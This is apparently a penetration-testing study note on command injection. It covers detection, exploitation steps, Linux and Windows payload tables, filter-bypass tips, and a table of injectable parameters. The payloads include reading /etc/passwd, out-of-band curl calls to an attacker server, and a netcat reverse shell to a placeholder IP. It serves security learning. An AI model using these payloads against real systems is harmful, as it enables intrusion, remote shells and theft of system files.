### What is Command Injection?

- Occurs when **user-controlled input** is passed into **system commands** (e.g., via PHP’s `system()`, Python's `subprocess`, etc.).
    
- Attacker injects additional OS commands to execute arbitrary code.
    

 Example:  
Input field asks for song title → passed to `grep` → attacker injects `; cat /etc/passwd`

---

###  How to Detect Command Injection

---

###  **1. Verbose Injection**

- You **see output directly** on the page.
    
- Test with payloads like:
    
    ```
    ; whoami
    && ls
    | id
    ```
    

**If the result is printed (e.g., username, directory contents) → it’s vulnerable.**

---

###  **2. Blind Injection**

- No visible output, but the command still runs.
    
- Use **delays or indirect effects** to detect:
    
    - `; ping -c 5 127.0.0.1`
        
    - `; sleep 5`
        
    - `; curl YOUR-SERVER` (detect via Burp Collaborator / listener)
        

 Observe:

- Does the page **hang for a few seconds**?
    
- Any **new files** or **network requests** triggered?
    

---

###  Exploitation Techniques (With Steps)

---

####  **1. Basic Injection (Verbose)**

**Steps**:

1. Find input that interacts with system commands.
    
2. Inject OS operator (`;`, `&&`, `|`) + command:
    
    ```
    ; whoami
    ```
    
3. If result is printed on page → vulnerable.
    

---

####  **2. Blind Injection via Delay**

**Steps**:

1. Submit payload like:
    
    ```
    ; sleep 10
    ```
    
2. If response time increases significantly → likely blind command injection.
    

Alternate:

```
; ping -c 5 127.0.0.1
```

---

####  **3. Out-of-Band (OOB) with curl/wget**

**Steps**:

1. Run:
    
    ```
    ; curl http://YOUR-SERVER
    ```
    
2. If server receives the request → injection confirmed.
    

Used to detect when no visible output/delay.

---

####  **4. File Write + Read**

**Steps**:

1. Write output:
    
    ```
    ; whoami > /tmp/x
    ```
    
2. Trigger another input to read:
    
    ```
    ; cat /tmp/x
    ```
    

Useful for blind injection when redirection is possible.

---

###  Useful Payloads (Linux)

|Payload|Purpose|
|---|---|
|`; whoami`|Current user|
|`; ls`|List files in current dir|
|`; cat /etc/passwd`|Dump password file|
|`; curl http://<your-server>`|OOB confirm|
|`; ping -c 5 127.0.0.1`|Blind injection|
|`; sleep 5`|Time delay|
|`; nc -e /bin/sh <IP> <PORT>`|Reverse shell|

---

###  Useful Payloads (Windows)

|Payload|Purpose|
|---|---|
|`& whoami`|Current user|
|`& dir`|List directory|
|`& ping -n 5 127.0.0.1`|Blind via delay|
|`& timeout /T 5`|Alternative to ping delay|
|`& type C:\flag.txt`|Read file|

---

##  Special Characters (for Chaining Commands)

| Operator | Use                                     |
| -------- | --------------------------------------- |
| `;`      | Run next command (always works in labs) |
| `&&`     | Run next **only if previous succeeds**  |
| `&`      | Run in background                       |


###  Bypassing Filters (Tips)

- If quotes (`"`, `'`) are filtered, use:
    
    - Hex equivalents
        
    - No quotes at all
        
- If common payloads are blocked:
    
    - Use `ping` instead of `sleep`
        
    - Use `curl` or `wget` to trigger OOB requests
        
- Try URL encoding:
    
    - `;` → `%3B`
        
    - `&` → `%26`

Here’s a clean summary of **command injection attack vectors** organized by location and typical parameters:

---

###  Command Injection Attack Vectors

| **Location**           | **Typical Parameters**                      | **Example Payloads**                   |
|------------------------|---------------------------------------------|----------------------------------------|
|  Search Bars         | `query`, `search`, `term`                   | `test; whoami`                         | 
|  URL Query Params    | `host`, `ip`, `domain`, `file`, `cmd`       | `127.0.0.1; id`                         | 
|  Form Fields         | `name`, `email`, `message`, `subject`       | `John; uname -a`                       | 
|  Cookies             | `session`, `auth`, `user`                   | `abc; whoami`                          | 
|  File Paths          | `filename`, `path`, `dir`                   | `report.txt; ls`                       | 
|  API JSON Fields     | `host`, `target`, `input`, `domain`         | `{ "host": "127.0.0.1; id" }`          | 
|  Headers             | `User-Agent`, `Referer`, `X-Forwarded-For`  | `Mozilla; id`                          |
|  Diagnostic Tools    | `ping`, `traceroute`, `lookup`, `scan`      | `8.8.8.8; cat /etc/passwd`             | 




